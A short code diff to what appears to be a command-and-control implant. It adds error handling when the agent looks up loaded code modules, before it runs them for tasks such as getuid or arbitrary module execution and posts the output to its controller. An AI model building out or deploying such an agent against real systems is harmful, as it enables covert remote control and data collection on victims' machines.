@@ -54,11 +54,18 @@ void agent_exit(AgentState *state, TaskInfo *task) {
 
 void agent_getuid(AgentState *state, TaskInfo *task) {
 	ResolvedPico pico = { 0 };
-	resolve_loaded_pico(&state->file_vault, &pico, "_builtin_getuid");
+	BOOL result = resolve_loaded_pico(&state->file_vault, &pico, "_builtin_getuid");
+	
+	if (result == FALSE) {
+		#ifdef CELEBI_DEBUG
+		dprintf("Failed to resolve '_builtin_getuid' PICO");
+		#endif
+		return;
+	}
+	
 	GETUID_PICO entrypoint = (GETUID_PICO) pico.entrypoint;
 	char *username = entrypoint();
 	
-	BOOL result;
 	TaskPostReply reply = { 0 };
 	if (username != NULL) {
 		result = perform_post(state, task, &reply, username, "success");
@@ -123,7 +130,15 @@ void agent_execute_pico(AgentState *state, TaskInfo *task) {
 	char *args = MSVCRT$strtok(NULL, "\t");
 	
 	ResolvedPico pico = { 0 };
-	resolve_loaded_pico(&state->file_vault, &pico, name);
+	BOOL result = resolve_loaded_pico(&state->file_vault, &pico, name);
+	
+	if (result == FALSE) {
+		#ifdef CELEBI_DEBUG
+		dprintf("Failed to resolve '%s' PICO", name);
+		#endif
+		return;
+	}
+	
 	GENERIC_PICO entrypoint = (GENERIC_PICO) pico.entrypoint;
 	char *pico_output = entrypoint(args);
 	
@@ -132,7 +147,7 @@ void agent_execute_pico(AgentState *state, TaskInfo *task) {
 	}
 	
 	TaskPostReply reply = { 0 };
-	BOOL result = perform_post(state, task, &reply, pico_output, "success");
+	result = perform_post(state, task, &reply, pico_output, "success");
 	
 	#ifdef CELEBI_DEBUG
 	if (result == TRUE && reply.success == 1) {
